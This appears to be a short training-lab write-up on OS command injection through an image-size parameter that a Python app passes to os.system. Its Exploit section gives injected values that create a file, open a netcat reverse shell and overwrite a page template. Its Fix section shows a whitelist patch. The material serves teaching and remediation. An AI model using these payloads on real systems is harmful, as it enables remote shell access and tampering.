# CMD
## Exploit
```50;touch AAAAAAA;``` . 
really makes the file, so execution is possible . 

For a real exploit, we first need to listen to a certain port on our own system:  
```nc -lvp 4444``` . 
Then in the payload we will use netcat to connect to this listening port and initiate a shell:  
```50; nc 127.0.0.1 4444 -e /bin/bash;``` . 

If you do not have nc but you just want to check if your code execution works, you could for example overwrite the index.html:
```;echo "<html>rishu's solution</html>" > templates/index.html;``` . 

## Fix
change:  
```    os.system('convert static/img/bones.png -resize '+sizeImg+'% static/img/bones.png')``` . 
to:  
```
    whitelist = {"50","150"}
    if sizeImg in whitelist:
        os.system('convert static/img/bones.png -resize '+sizeImg+'% static/img/bones.png')
```  
alternative in php template: escapeshellarg() or escapeshellcmd() in PHP . 
